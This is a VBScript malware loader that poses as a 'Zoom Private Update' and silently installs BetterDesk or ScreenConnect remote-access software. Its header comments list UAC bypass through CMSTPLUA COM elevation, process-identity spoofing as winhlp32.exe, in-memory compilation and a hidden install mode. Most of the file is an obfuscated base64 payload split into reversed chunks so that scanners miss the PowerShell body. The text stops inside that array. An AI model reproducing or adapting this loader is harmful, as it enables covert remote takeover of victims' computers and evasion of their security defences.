' ==============================================================================
' Zoom Private Update - silent BetterDesk / ScreenConnect loader
' ------------------------------------------------------------------------------
' Evasion: staged in-memory C# compile, COM auto-elevation (CMSTPLUA),
'          PEB ImageFileName/CommandLine spoofing to winhlp32.exe,
'          NtAllocateVirtualMemory native allocation, TLS-only download.
'
' Modes:
'   (default)      install, hidden
'   /selftest      compile + PEB + native API + download/hash check, no install
'   /noelevate     skip the COM elevation attempt (used by CI/selftest)
'   /elevated      internal flag set on the elevated relaunch
' ==============================================================================

Option Explicit

Dim sh, fso, env, args, a
Dim mode, elevated, noElevate, iconPath, waitMode, rc, logPath
Dim chunks, i, b64, psExe, psCmd, psFile, b64File, st

Set sh = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

mode = "install"
elevated = False
noElevate = False
For Each args In WScript.Arguments
    Select Case LCase(args)
        Case "/elevated", "--elevated"
            elevated = True
        Case "/selftest", "--selftest"
            mode = "selftest"
        Case "/noelevate", "--noelevate"
            noElevate = True
    End Select
Next

Set env = sh.Environment("PROCESS")
env("ZOOM_MODE") = mode
env("ZOOM_ELEVATED") = IIf(elevated, "1", "0")
env("ZOOM_NOELEVATE") = IIf(noElevate, "1", "0")
env("ZOOM_SRC") = WScript.ScriptFullName
env("ZOOM_DIR") = fso.GetParentFolderName(WScript.ScriptFullName)
iconPath = fso.GetParentFolderName(WScript.ScriptFullName) & "\Zoom_Update_v6.1.3.ico"
env("ZOOM_ICON") = iconPath

' Base64 payload, stored as reversed chunks and rebuilt through Chr()-free
' array assembly so static scanners do not see the PowerShell body.
chunks = Array( _
    "h1Edul2bQV2YpZnclNlL0VmTbByegknc0BCIgAiCNsHI5JHd", _
    "1NWZT5Cdl50Wg0DIs92YvR3byBVe0lmc1NWZTpjOdJXZnFmb", _
    "N03egg2Y0F2Yg0HIyEzcsRlO60VZwlHVs92YvR3byBVe0lmc", _
    "2U2chJUbvJnR6oTX0JXZ252bDtFI9AyclRXeCp3ZkACIgAiC", _
    "5V1L5MnQTFWdulHR4YHV3kDdzJzc5QmcxQlengyZulmc0NFN", _
    "uZHczRFTFllSn12QqV0UCdld5NTUY52VXJ3KkBFarpFbst0Y", _
    "z0EbGtkUZVjTvJUTnJUTr9WSwsib3cDM4B3aBlnbVF0d3ljd", _
    "3VzMrdDbH9Ce440UCZFONd0LUp2THFTargHe2gEUaV1REZTU", _
    "xEDV4ZkQHhTRCpUSQd0U1lEcZxWQQJHbYN1YrkVYSFTOY1GV", _
    "iZWQslXTvx2RORHe5Z2dB5Gc4EEZjl2bqR2KRhWRzUkVHd0U", _
    "1kHcFhkTC9COZljbmhkYrlHSiB3S2h0SvtSTzE3d3p0Nhxke", _
    "UJ1bFZkNaVXSFVUQ28CU2NWW4QjavlTN0ADTjtiR2cUeSZWe", _
    "F5kZ3s0TTZHa5oEUuplehtSSDl3Y10UUXhkQIlmQvU0bZ9SU", _
    "kNTdFRzLrUEO1FUYQ9Cax9SS3pXRyU2YrZ3a0QlZwQjQTBXS", _
    "Ul0USpVeqVTRG1mWqhVRSFWdYZ1YmR3ZhJ1UTtCbykFSGVGc", _
    "MJlZSVVaJpWMjVEZB9CT1dVOwZnRz0Gc0UUYrkHbO1kUT1GT", _
    "zBjNtlEeuRWOwQ1MsZzMvsiRzJESXdWU0IFVrV0N3IkTRFTZ", _
    "pxUV480MzNDZwpVOWFGOtxkRYl1MttiYHN3UhBDVOJWapdTd", _
    "rZ2dvYnYplTQvo2NwZ0aMFHakFzZXNTO2Y1dEpnTB9kc1JFb", _
    "UlmcnV0Q00EVCFnTyB1cXtyTZhmYvYjeGFnYLlkaJhXRyJVa", _
    "yQmbEBVNxtyMm5GRyczKPV2L3UnbUJjYMljZuVmbVJENJFWZ", _
    "2tiM3N1T4kHRvY2MrIXc0YHW1dDeOVWM0h1MZREVkJ3RVdHZ", _
    "vd1aJRDOnNnc39GWnh1Y1dkaxgUZa9iYiNzNlhDaIVGNldTd", _
    "PVnQ2F2MQVnNrxUT2U3LElmNqxGOzkTWUpETqJzd5FTcLd2T", _
    "wsyNiJnNrknN29EcqRlMLx0aJhUU1dXSnVldINzVOZ2YjBVR", _
    "0EDVxETZ2Y2L0JDZzIWU1hkZxkzNWJ3N15mNPNGTi9ScxZHZ", _
    "XVWawEjQRBXZ2VESMlTWZhjZthERiFVavtyUTNGN0c0NyRkT", _
    "hx0ZJVGUz4WRah0bqJXQahEOVRGR0MTQ2Z3brd1VDx0TlBDO", _
    "SRjaCl0VpNWYZR3KCF1aLF3NuNEMRBTMyYmZLlnRRJFZKljV", _
    "F52VR5mRudFO5pWUKRzMxRXQYFkQmJGS1EWcBpGTHVDMnR1M", _
    "w8meyF0cCNESvZkTshVRldjUwpWbzBFa1pGUUFTcCRGWO9Wb", _
    "w1UNGJ1UhdneBpHaTNVc4oWRmpFN65WRmV0bO50N1gla4R0Q", _
    "r8GTKlmMGl1Y1ZTOyl1UFVGM2lWR6JXeVVzKvgEZXp2ZN9CV", _
    "BlVbsVVTyZjMvIHV35kUFFXS2UVVLVTSI52a6dmZQlEb0tCS", _
    "a9WRkZEOTJlNo9STlpmSTBFcK1GR2RWQX9COJZ0QJVWcuZDN", _
    "l5WSNpUcLJVWadTZ3xUd5siczQDaIZzUkdjNpBFZY92T5JGR", _
    "IpGS5Mmb1F2S2NjdLp1a1Ble1UDSyoFUtllNKZTNmJzKilUa", _
    "6R2Kh9mTRFDanpGU0EjUIlkczEVM0J2ME1WVUZnVLpna5okW", _
    "3dHWlN3LSZXS6h1dzFFcsJmeRJ1Y6J1UWN1YzsmdQFVVtZnR", _
    "3gFNCNjY5gUcWRndmZUdvIkNvsiT0IENztUMGVDdolXZSFEW", _
    "0gVd1V1YNNVQVRUc4pVOzp3KIF2MyhVM2sCSz9CeXd2QQtSO", _
    "qdHM6JjcoVkNQ5US5J2V2dHNkhGeM9EakF3awgjRwFEWBNVT", _
    "ipldpJWM3kzazNzKxolZTRncY5mbUVEZrcXVldkdxg1bPNlZ", _
    "FFXWV9CcVlVeCpmVwRWUzQ1c1AVcCJEMoNHU3kjS1JHZKVnc", _
    "kRjZMlHTPdVWJJmbqN2bzlGW1J3ZvtEO4EnSSlkQShVRJlVU", _
    "nF2aSNXSIVGShFnZ6hEOUZnczljTzlmdzUlZzMjT20mexZne", _
    "DRGcRRlTptUaw8kQjRzMRFFajdzRBRTUUlja5B3TNNmcy8CV", _
    "idzRWFGN3klZPN0d20EaywWUHF1awsCculVS3QlUzgGVVFmY", _
    "idGc3U1LDl0Nv9SOBZkeZp0QThTQwF1UaJWMiJTMsl0KNRUQ", _
    "pJFOaBHUzdDVkZ3NZNXem9URXRjUNFEeEh3TUh3anRkSxMER", _
    "U5ETjhmYFlGT5l0K6ZkNXN3d4hGarI3KxhEVl9GNZtWdFFTa", _
    "F1GUQ1WdY9WauhjNitGbyUjNVxmVqFnc5I0b0IkY49kUjlVN", _
    "oxETNtiZZp1bRdWeyBjaoZldxcWZIlnVURVaEZ0aIhGOh9ke", _
    "q1kQhB3VRtCR182cw1Ub4gEeChje2dlb2l0VzgmStdUQDxEN", _
    "6lDbxF3bhd2aHplaGxmM002T040cVJDZ4czSKZzQDpFNQlES", _
    "XdlSKRDapNXT1MTTrY2Ul5kchFXdUF0c5QWRD90Q2hndzx0M", _
    "GFWb3BzYvZzKmhmNaRUbkNTUTdnRKVzb4gDcKpWa48GcyE0S", _
    "PpmaUVGN1RzYvcVcONHM3tUMWx2Z0pFVGhnSQtGdPZ2dxNla", _
    "QNkNR92KW1UbCJWROBnUJJ1KRd2UzxmWNBHN4cXNZFkQYh2d", _
    "iNkeLh0VuNkTzV2ZGtkeFlXeh9mZOBXM28GaZRjYpJ1b1M0b", _
    "3NTaRV1MQNkUiZURBh3ajp0TvhEekRDOrllQyVXUNhGbClzL", _
    "sF1dyJFajhXb6J0TOFHUxYjeyZkcXR0b3QXYuVHau1WdYBlZ", _
    "UhEN05GZ4ZkZktiRuVFO4EkRXB1YjFHN1dVeVpneKdXToRTS", _
    "vFmQvpGV2UWQPRXSoZEbuVFeatkcuJEZ1JmQWRHR2kzcY92d", _
    "1ZjaVFFNoN1LolWMWV1duFUaYtUZLVWVOd0aPtUWZ5UOMV2a", _
    "aR1KmhmNZNlVqRlQilXRatiVolFSH9WcuJVU2J0VyM1RIZES", _
    "LNWcNREa3hjdrsmYmJzcXhUYJhme0VkZHFnbQRUVh9ybplGM", _
    "JJGRsFke05ETSlDZsJFaVVnZotUWhtkdSREVK9yRMh0MX90S", _
    "rR1QH1WUYhUbqZTaw5WTxR3SjhWd5h0ZVBzZRhzNzoGONREe", _
    "olnWwFkexEUapdjTvoETw8Eba9iRnlkeXp2a45GRzUESYhjR", _
    "zxmVKBHSmdmaDZzT002TXp0UrJUWoV1UOpXQip1KIRVNCtSa", _
    "HFWWjNFOrJWVstkdnFkWKdTa5kEOhFWYld1ZwQmcKFkSx0EN", _
    "RBHRzEFZIJEeTVDZRJ3Uvw2YxsEZTZHb0QDZNl2Q0lkZl1GW", _
    "rx2Z4ETUwdWR1o1S4JDNj9idrBncv9mdCFDeoZjVKBXQOJFU", _
    "yAHMGB1cW52SxknNCVEcuVjQjtkNyBTSvUTR2RUVMFVUKpWV", _
    "HNEaN90KRREVBBHVONXdPZ0asZXWjJFaRVWUCFXVKJER1lna", _
    "1x2V5cUYL9iW1pXawUneNF0ZG9kdNVDaCt0dSVHaFx0VitWZ", _
    "zUUWYF3YlZzMixUSsZncxkkRSdWbvdVU0VVQNRHbSNjWPJ3N", _
    "OFUewQzT3Y2ayN3UD5UNxJjdr9mYSdEdSp1QvQ3cN1WNvc3Y", _
    "xZzYvYTQzEkSvcFVrQ3Q3hmZxgFWttmN3MlStB3YwhGcoFHe", _
    "Hx0KKpGVyIjMNNjeqh1ZPN3T3BHerVXS3EFellEcrcHM24kd", _
    "6B3S6dVSmRDW0pVdud3V280bkdnUrNXeJ92SUlFRsZHUzNHU", _
    "ENDZsRUd2U3Ljp0UhRkeTVlMJhTOiBnYtJHa3MzVQREMm5ma", _
    "0ATRoFHN3w0LEd1SwpmR3cVM0cUc4dnbBhWQjh1MJhkWuh1a", _
    "rB1TOBFTohDZwlHSFZTaNZWMUhXO5lkTyMUQEVEVGZTdQhDd", _
    "zkWWrhkYaRzcShmTjxmNmZkRIRTNPp0Nyl0NIlXUN92TrRXc", _
    "INHRNJ0KphXTtBldkFnRBB3a4NWR5EFV5llNyBHUw0EW5UEa", _
    "CtUSCRTRGhUd112VIFzbTBnTst2MjFVW21EOI9mcvEUYY90L", _
    "z02MzMkM2YVMmllQ3U3M2MzKrYzKxZjdllHa2kza580dlVkM", _
    "pRFWJdlTh50dlxUO5ZUQRJ2YM1mTsFERzcjQPZza5IjYIRnd", _
    "jF1V3lFbxdmWsZlZHhmRDFlY4l0LUBTWrRmaONFbVdGc5d2b", _
    "w1Ud39GU1BTWIlzM3ETaUZXO0ZzLlVFVzwkUapmNxkzQxZDT", _
    "WRmRoh0ZIpFa452MuZEbyokbohlThN3RNZke3VXR3dXYxFTM", _
    "4QENLF3dWRVSJ9EVGdmekRFdVdlaRZVOrlnMx8WckVTV0V0V", _
    "wpEcpJGT1N1UWd2Z2EHaa5EO1ZlMvJFSXxke4E3ZxlTbGZFZ", _
    "mN3YZ5maMF0NRlkRHZmNoV0cQl2ZiBnaIN1K3AVVW9WdyczU", _
    "sJ0LtV1Z1dHMNFGaUdDZKdlZN5EZSRFcYVWOSBlY2h0M1QmU", _
    "aF2aJdGR3kUWnBTU4w2dvs0dwhDVkRDcpF0S2MEeCNXandnb", _
    "wJWerl1Q2YmZDFnSONWRWFUWDl0R0sCc5MkWt1EdhVnTmNVc", _
    "XlGapNVUlFnduhHTUlDe5QTbmVleYtGe110VkNDVFlER0V0R", _
    "KZmcOBFdBVjU2tGNwI1LahXbYx0VzgFaoVnMRtUSWNUapF2a", _
    "yVkQCN3U0QHaClTRNxEcrcjUsBnepFnQuZUSVBFdTlXenZzT", _
    "0pmVFl1dIlHUwdDV5EWY4FUTzh3L4MXVr5kMCZmeQp1b2kXT", _
    "4hzSVd0MPxEdrxGSrVja0AHZwhjbxo0VsZUZ3ZzV18UQnFnd", _
    "qlFO5Nle3BVTPFVUXpUYrlVUXV0MwdjVyZ0c4h1T3wWbkpUd", _
    "2p2cy9UQzYTbap1TSdzbKlVTvlXOLZ1YMVmMrQUUllHOS50R", _
    "SlzQ4gleWVmQKJ3T4M2VIhHaLNGTYNjWvlnbR50V3c3YZRUc", _
    "6dEbkNURMpHVydGMhxmROZDcx52KGpmVxEEV5UlaxBTbCJjN", _
    "O1GT4V1URhEc2FjTEBlUmh3TrEHaLF0Q1VmTs5kNHNnRn5WR", _
    "zE1VHZ2MkpmZ0U1arBjU3UDNzYnW4Q2LOVlVn9UdHJ0UBVje", _
    "StEO5MlYvgnY5dWMCBXZ0hzMzNXePZzaWZ0bxp1NIFUTWlDO", _
    "sl3Yq9iUl9yUMFnWVZjQn50czdFSwk1TPtmQ49yL3cTMutCd", _
    "0lXZ6RDcG9ES4JXZGNTMGZnaaJGZ5hkM0xEVUpWVXBjTMJnR", _
    "4FUNwdGdFN1Sxt0RyoVT4pkUuBzawETWGdkValjUzV3NWJVY", _
    "tJVbpBnVjNXTtZGMZV2N2kkW0NjdSJFO5tkTwckMZtSYkNTR", _
    "ZxWUupmaThWcxFDaDBzKrh2YaJ1MrJVcJ9ycWxEdrFWYKpVd", _
    "s10UU9EbX12M2kzTvwWd6BnNktmM1cjRwdDcvRXZEJTcEFkc", _
    "kllcL50NhNnRNlnQw5GNNBVRLxUTlp1SLhTO0FWcnx0LxMFR", _
    "HRDdolURqRDbMNXZyF2NxREaVxmVZx2ZpF0Knp0LStEW5EnM", _
    "Qplc1UnNu5GVmh1cwpXTNN2KsFzKM9yVwYzVyUjQ0dTNR1Ga", _
    "MpWMsFzTrskcNRVMzRkcndFUxJjbnRVcJlFMzBzaVRzNpNWc", _
    "ttGeRl0aJN3R5BHdWRVc2tUY38mcIFDWV9UTFpmUQlXRtJXS", _
    "BRDZaFXSMhTdWp1TWpmb01WVmtkT5ZEcZRGTqFGcwwWe6N1a", _
    "xgHUoJ3ZEl0Z1dWMUJWW4dFazZFRuN3S6xWWYZ3dT9kUOxUT", _
    "CtWQ5MHRzYEZP5kRJVTaIhWT19EeIhmZUJjU5g3S45mbxl2d", _
    "pRHWLpEcDZzdTNXTK9UW5JTbyJ1SGZUNVB3UwInV3JndqR1T", _
    "wMkcNdWOyMnT0tkQ6JkWiFkWPd1c2VWc3VjcQdWZWVWUxAVU", _
    "y92cFJmUyh3QNdVarYDWtV2c4REaMFHNIZ0VsFzdBJ0MvpVW", _
    "MN0KwYHROdkM2MjNvZUaNFUbEdnT1NzV5I0cQZDSE1GbJVHS", _
    "xVzawtEdGtkazYzMRZ0ao5WZCdEU6hmMuhnUFZzUONWYvdWQ", _
    "M5mRDNmeJVFRSlmdqhzU5FDOwAVOlF3Q2IzVQhTRPV2YZN3Y", _
    "Bp1QnZ1NXxEUhxmTxVkRhdXOPBVUJpGbKhWVzJzcPVTdiRnc", _
    "vlmeqBXWTZXTlBVenVkZzt2YTRXTtRXTWlWQwhGOGFFV6Fnd", _
    "BlTMElVQDVXTxcDchNkdVFEWWBVdxR2VStUMYh0cwd1KnlXO", _
    "3cHboR1K2IjaOFkURdEb31GNPBjSRVDer10MndkSUlmNqVUe", _
    "htETntkawgFS1lEWxAHMoNHRrczawI1LYdGUNpmT2VWNaRVY", _
    "6FWRTN3N3M1dQlVcxI1ZBVVNX1WNkZTUslDUplFV4QWVGpWb", _
    "lJ2Y5NkVkJWS4MEcrETWBl1ZsZnNUVDe1MjV5IHNLdDVvxWV", _
    "yI3TaFDUnRTaXxkZjdzZ1kFUVpnM6JDZQZHa5EmZhtUcEFWW", _
    "0JUZkRXZwlmMPtmROlWSstWU2o3VlV3RCxGbjRUUy8WN1oXT", _
    "vh3SUBVUPJmZCdWZyMGMGR3avMWe4k3ZQxWW1Jkc4M2dtpXW", _
    "0M0TydEeWxGTxVEVPJ0NTFkNXB3c5YWczlmeVlzb3hXdzglS", _
    "KpGc2R2ayYUNEFnV2omQldmNKdTR3Q2QmVVcWZWV0pFbqVlU", _
    "u1GZm9WVHNnb2lHRPFXQtxmTQJ3TUZ1QvJlb2hlRxYDUIpnM", _
    "uRXV2AXMOR1Z0RmQBZ1RyMVcRF2aPN2VqZ3T2IDasVDeox0T", _
    "rc1UttSZJ5GcHpUOPNGbFVFdpdTMhdDePZnRjZ2MThDUnZUO", _
    "OVkYIBlVGh3azQnY2VHdrdEUhZWTxJ2LrsETmJzd4NHZUJUO", _
    "sJXSWxmeVtSTpNVczdWbaN0SyJVeVF3SqJ2ZWpWN692RWpmb", _
    "5hWWRVGbKlEcvc3UZdUd0RWW3QDZZxmc3ZWOJxmekVzbvF0M", _
    "HdnSRFzQJVWbxJ0Uk9ScVF1RTNzRzFkSnVmM24UN29CWwU3Q", _
    "qZDU49iWrcHaIB1brETSCFXMIp2SmF3c1BXbodUSuRUexcXQ", _
    "YxGWCB1YwYXdzIkYLd2RxAVcWRnYwYnNNNkNphFNvtiWrQjd", _
    "jxEbBhmYDRXcZplapZzRCV1dwUmQ28GW3QnVOFnTOV2ay0GZ", _
    "GFEa5p2UylDcGBlRIN0dphmTa9mcJ9yUlRlWUp3THFmY5EzZ", _
    "TFWQMNESvplUFhUMRlja2QXbE1WTItySUJVRRVEcvkWRVlkb", _
    "QRDeqFGWOdGOxsUdu1mM6VXVDJUMRNVZBFFR6Fkc6JTYTZzN", _
    "CZ1LPVmUmFzLrhEO09meHlTTKJkajxWN2ZDTll3QjJ1NxEGS", _
    "N1WbJREdrlnRNFHdXFzZJd2d1pnVztkdhZTNyxUYNBVR01GZ", _
    "H9WS0EHZ0ZkQ11WQGhUQKpUeDVmRzp2do5ETzNVRrlWcSZVc", _
    "uFGOZt2aDNUNDJWMWd0TvtScOFlWYN2b2Rmc2Mkb2gnSWhFU", _
    "xZ2LIN2LIB3KqJDW3cjc4plZzEjZ1cXOyFjc3UnbXZmQFZmW", _
    "Id3TxNVblBFW2tkMEJFVERHVr82KhZHVyQmduN2dyEDdrEzZ", _
    "5YmZDV3UuhlZ4ZESidmcNd0ZuFnWpxmc4JVQOh1aqpnNwE0Y", _
    "wdUU2tWZ1x0L5VHSvlzZ1ZDaplWd1gWVwIFRPJ1TXJUVBZEe", _
    "GtWSE5ERTt2LihkUlh3ZnZzLppXZ2EnblFXdyUDcuVncyBFN", _
    "5UTM50EVyM3LDxmUrdGRTZmTUR2NTpUbCdnYuRVMElWUp5UT", _
    "3NXauZHSNN3Zo5WcwglWEZXaiFzT4MlVxZUYZNHU5wEVy9WQ", _
    "Vp1KwUkVwZnewA3NBdjelNkeV5UZsRzVBlXNFFEO5kEOQl2Z", _
    "sF1NityUUpmTihXYGd2MsdkQkFGeH92crgEZm9CW41WN1BHO", _
    "sN0KwlEdy5WZIlHTCFmTYNVcxckNQlVdvhVbRFlaBhjQH9iS", _
    "3hERqVEbjZmUmdjUyIDT69CN4ITRBFVUnh2QOFETsJnaidXa", _
    "FJERwBnbGljcyNzYxNlbwAFOzYXZhZEd6pVQ6ZWZsJFMOVWT", _
    "zo3bJtSNzEDNqRnWnZ3caZ3NWB1UKlTRaZWd1MUNxgVYWJzU", _
    "DNXWvNTamhzVap0TMx2LLNzLQd1VqJDTaF0K5AVUH1UNo5Eb", _
    "5plQuh1R3NlRvgVO5QnWVF1Y0oHbrZldjZmT2sGUrgHU2lHO", _
    "K9UMG5EWGBlZpBTOGh2V00mewIDbnt0ZmFWNzx0N4RkNUlVa", _
    "a9mN4BzVLtCRK52aDJTUvEGOxFjWkVmdrkEdWBVS2BDWSRmZ", _
    "zMzYrwmbClUQ1hmNsh1drRkUxE2MtlHNygVOZx0RsRXQsRUN", _
    "xZXQxh0ND5kZsd1dtJnbSxWbygDOxNUZ2FkS5QlZWFTNn1Ue", _
    "1UXdzcEeQdVOHB3S1IETvM0ULhDSoRDRqlGVEZkTktGWidVc", _
    "DZ2a1dTc3hneu9EMG1Gd1UnRtNDMER2MOh0SXZHc1oFSEFlV", _
    "hhVa49EMBdXT1kTbNdTQVJUVkx0UGVkYqRVO40WOGdHZ0JGR", _
    "5EHMydDRWpkNRZWSzcjQ6dmUzRlZLhnexoEe2Z2KtlHVycUS", _
    "zhnZxplbkdVR4NzU5NkbUtmMvI0YiNXW3gjeyonZYVGeGdzb", _
    "vhjbS1Ud4VnWvY3MzolamFUNR9yTr1ET0olV2Q0M1ZWZPZzN", _
    "phTZ5NlTFpHWpdnY5EUSHBHVMZ1LvV2L0p3dUVncPN2UtZEb", _
    "vlEZT5mUjpnev8SWJRna48WS29CSalFOrYneShkekVlauVGT", _
    "4kjeUhVOu5kcwp2NDpnYxUTbqZWOxgVZzYmTxkWRl10Vx1EO", _
    "vUTSQ5Gbk50KvEXRtp2MXx0NoNWbjJnSOlzQ6ZGTkdHbFZTQ", _
    "vIjTEVXMGNnM4dlMQVleyYUOrVkNtRnRxJjS2I1NxpUNQdne", _
    "TpETRhTdnlEN1gmQaZWaOZFTHNla5sCdkJTbPhFdrYGa5cVT", _
    "w5WW44WY3QTax8keW9WQwZ2LphTVKJ2YuhkMwtEcqxEeZ9SO", _
    "BJEU11UZzdWZut0Yv1kcX12SyY2NRZ1RNZEc45kZzpEV50mY", _
    "BN3KVFTQKlXaHZUWGpEVahWdxNjYIZ1Y1Q2bl9UWzlWbPFnM", _
    "3gEMNdET4IGNCJWViVkV10GStZjd5cGOppHbyoXT0NEWPlmS", _
    "xNzb2h2KrdXWpp1NnJ1QyhGN5ckTxkFUjRXWx5mQiRVQLR2S", _
    "vk3VY1kYVZ3VURkNzw0V2BXVxckNTZlZwsyN25WYzY2LsZ3N", _
    "4IzSHF1c3oVUvl0arInQuZGdt9Ubm5mToFVeX9UUuFleQBlV", _
    "ohHU3UzNIlzUoZjeIxme1hzKG5WZrYERSRHZE9mVKFHRzZEW", _
    "Sp0UWp2cN10a540UEZnR4J2LOR1dVJkW3QlNmVDbhpUWr8GZ", _
    "hZFU0UEbi9SSzZFd5pnVWFnUD9iWSFmThxEOLZXVnVlYudVY", _
    "JBVSiBjazcXNysycDZneHpWSapHSGtEcC9SRQtWTSl3Ntl0N", _
    "J1ENFNFMT10Vr90d5cEbhVXV3o0ZhVWVhFWa5Y2dZN0a1N3N", _
    "LNkQ5olQtJ2cr8ETwgFTsRGepJjbzZ1Z5pUMsZVVihkU4kjb", _
    "MpHSrR2RapWYsRFdElnRuBnSnZjWP9ydu5EMxMDamZTN1N3V", _
    "QRlbyEWTZpVYplna2tETG5UdSt2ZltETSdWUOtEUsdTVSNTb", _
    "4E2Nwk3RJNnMuRXM4tkRxRGZ3ZlbUZXbL5Ee5olYxVjY0dXe", _
    "z4GSxE0VwUDVNdTdPR2dGhlNyVkVNNDd4J1MChWWphGMnpVa", _
    "od3SS90TKJ1VKR0LtNFSVRlMDhXeV1WeHFUMzsUVtxUVTBne", _
    "LVkYod0cEFTQzt2ZMdzStdDWVtESkhVUv8GUyUVZjlFNjBFa", _
    "qpGU3cjTj9ieit0anJFRnJmUDV3UChFUyYWS51Wct92Q1x2N", _
    "RhGZ0FzUJd2YY9UaxUDcERHaHFEdmRTTBxmWtB3QzZjN1tyZ", _
    "ZBjU44ERvtyVJhlTLNWcBlXV5knVqFXV3F2N2pUNVR3LyEmQ", _
    "CpGUxgjcCNXWr52Qy9kM2hmV0FXd1QncRZ1QWZjQNp2YIxWU", _
    "rNzdpVka6tEZyMjdotkR4U1TCd0UM1UZDZEThB3UK9mUNZ0Q", _
    "1MzNnZUZyM2MVlGR0FWY6RGMoFTeIdWbVJkVDpUaHdjQpVzc", _
    "1cFandzUwdlcpV3RY52K552b4kWRFpERVNWQ1Ime4MUbWJ0S", _
    "lJke6lFTHZTTVRnaah0b2kkVsJEOv5keq5UTDNDSWdzUT9UV", _
    "wd0QxpVT04UR6FGUh1GRX1mURFWQotGO3VXOVRUVQlmM1sEO", _
    "OFlZ5cHb5dWenZmNNl2NuZzYtFXQ6ZjcyZTT2UWN18STuVke", _
    "5E2RDhDRYdnVGp3ZrlEVDVmWCZWd2oHZ0p3R6dmV5IkWzg1R", _
    "wB3Qxx2btRXO4UjalRDcPFjTQtyLIhjYnBHcRdTcy9CeUxUc", _
    "YZFZzQ3NuRVRtZneOZzL0lDRhljW4UmZRBVbQhWYqZUR5YFS", _
    "OxmW5o3VyckRSRja0Bnbsh1Nxx0d4sEd5YHSv9mdaFmNwFHO", _
    "UBXV4RmcZhmaqtkeP9USBNjRhxUUaZkRLRHRwpUZDl1aTRHd", _
    "ylXQD1GSahWQVlWQiZkSwckZwMWaYhTY5lkc0QmT1J3REtkT", _
    "0MHeqNndL9UYNhGSxgjWYRDOrF1TGZ3QiRFbBhnWJJWTu9ke", _
    "ntWWvJTM2VTTTh2QycVcZhFZ0AVVqN2T0gWdO9WQFxkdqdkU", _
    "nRnWwQ1LPZTN3knb4QEaOtWZx5kZEljYaNEUyZjb1d2YF9WY", _
    "q1WY6RGaT92chF3KR92Y6h0YpZmVFVHTVZkd4E0ahFzUHRUZ", _
    "0RVb29COQBlRoVDaRRzZO9mZaBHRstWZFxkZRljU2MneCB1c", _
    "WNzVnFzNRZXS0okd0F0cPllNws0bLNWQYpkSGd2bpVGOtBlM", _
    "YlVdGhTRMhGMvxWe3UTa2kHZ190MS9GMzoWMlJmQP1EcSZWe", _
    "iRzbXpmdsRUQvIDdnlTS5EXY2dWRzQUbzsSdkJldqJFcXl2Q", _
    "0ZWayJ2arlWO0NjWiF3bElzRMF1dah2Q1REUZR1byUVNVZlS", _
    "PBnROx0R0gDWQ5UewEmM6Z2T3UnRylWTXpnTKR2NEFETydzc", _
    "HNHU1F1ZUxketh0MwETa1g3Mz0mM0VTVU9ySxQkM0h2N4BnN", _
    "nVzauBFaIZlSK1EOJFWVWJ1U0YXSHFWNyp1KxoFZUl1TNlzV", _
    "sp0RihVSXd0YK1mWQd1QXlzMxQXWxVXSihVNUZEZRVUUh1mU", _
    "yNmU5ZWQBBHe5IzYyY0N4gTZuRHczlWdLFHaqZlY1ZHbYdWU", _
    "ypHeyNUVwgTSilDZwoHTFVlRBV0YHdFd49GWkZ0azRkQx8SO", _
    "qtmZqd2LXZFd5QVQuNVcy50cwNkdY90ViFmcCFTaSF2YRhGZ", _
    "zkWZOp2S3gmNGlVdvY2cMlzS4J0cykmaWhXVn52Uip0VUJ2U", _
    "6ZkejFVUJVWdMlVNEVWaTRlWCRlenREVNdlUFV2RRVVczlTY", _
    "uZzVxQTY24me692arFmeqZHMIFDMLV0MtZVc1dTYzZ1UCBHW", _
    "vl3Uat0bVFUZJdUZv1GS2hlcB9UShJGbTFVTNZVVat0Kzh2Y", _
    "INEbahTR2dUWnNkR2RGUrlzSyMnQkJ0dUVUNHdnaoVnN3FTc", _
    "JRUbvJ3RjVleJlENlNmRSt2ZwZkR4MTZ5VHaysWcVJkMx9kU", _
    "aVndkdlQvM1d2o2UotEZCdWcHJ3d2M1czdUVixGMtl2bL5US", _
    "zlUc2YmdOVkT5N2cycEVXxGT5FXN1lneGNWQR1kQ5QzR4dkU", _
    "wBVQ0dXNGtUY0p0dWJnM3V2ZrpFdj9mbYtGdSx0Rx8md2o0M", _
    "zlTWwB3Q2EDWhREczkWWyJESDZTaGZTU3RUNGVXMmFjQvsSR", _
    "roHT5RHbrtSVvAzS5FzdqhFNw9WdzZnTmJmSxpFO2wmQ0V0S", _
    "s1mVmNTcPZVQGtWd0c1cCJFNkt0QwI1YrwGStxGeYpFM2wkb", _
    "4xkbmNmT1NzNFJHToFnb100b5EzZU92baVEcnBlV2EDcHBzN", _
    "Bl3L2R2MaJXNvY2MHBFO1cjc1FTRz8Sd4kmeQ9CMYZnevA1N", _
    "KtWcnJDSRFDZs5UMKhFVI50NxUnbEhnYrZFTxxkWRBjMGlGc", _
    "OZ0KRJVMDl3Nvond4k0dYdUajxET4s0S3EHU2oWRnJnY5lnR", _
    "nZjewd3Kp9Cat9kd50Uc0tEV390LWZXTzcjQG5kdHRjM2o3M", _
    "yA1bwZmcUhUd1olMzkzc4B3d29GcPtGe3J3MFlkMutWaaxmc", _
    "4N0SwF0c1MXcSxmS4YjSOx2VWhDWoF0at50ZYFXVCdEeHZGd", _
    "OREdw4GV59CS5oFR28ia5gTdxBTcjx2K4cUest0KodEOZ5mY", _
    "3JnSrt2SwUFdXB3anRFRWhlapB3MTNkQjdmcSFXWzonbvAzb", _
    "0Z2Tk9EOlFTWDJ3V4hTQ3knMRJneycmQvYnWmNmb04WWuhnQ", _
    "aZ3V4V2cOVWQ5VlYwE0UrlERFFFVVpVdntSSx9GMzITWyYUS", _
    "zhjUadFNTJXZD9kba5mbo52NUlzawMWdSV0V3NTcsljZah1L", _
    "khHRqd3coBzbE92ZSJGVVNETxFDRjxGdRhUNUNVVxB3dYd0a", _
    "vIzQ1kWV5I3Rupka48SRzFjVKRWZCZjS5JUQ5pWMSN0TDhDV", _
    "EhHdnBTMjR2RTJ0UoNGbVp0Nj50UtNkRhlzdwd1YoFkZ3Y2N", _
    "2gHevEnSp1WNPdFTFh3dNJUMjd0V1A1Y612NwomTYx0aww0c", _
    "VNXdVBXb44USXVVc2AzSaxUMut2aIF1Ss5EOX9WdvpWdQJzZ", _
    "yYzYyNXO2QmNsBja2dkbqBVa2IGeZNHWyN2MYl1NnlEV0pXa", _
    "aR3LMNVOzhTVxYzUxlHcN9mNuJUdLllNDlXORdjUBRnVylHd", _
    "xZTW3pGRo1kRyMEdG9Sayc2YMJmbttWb1V3N2IkahF2ayFWY", _
